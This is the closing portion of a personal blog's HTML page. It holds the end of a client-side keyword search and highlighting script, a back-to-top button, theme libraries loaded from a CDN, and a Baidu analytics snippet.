                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/materialize/materialize.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/aos/aos.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/js/matery.min.js"></script>

    
<script>
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?40e312a1eec109cf96e30988cf3bfe70";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

    
    
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    
    

    

    

    
    <script src="https://cdn.jsdelivr.net/gh/miaotony/miaotony.github.io@master/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
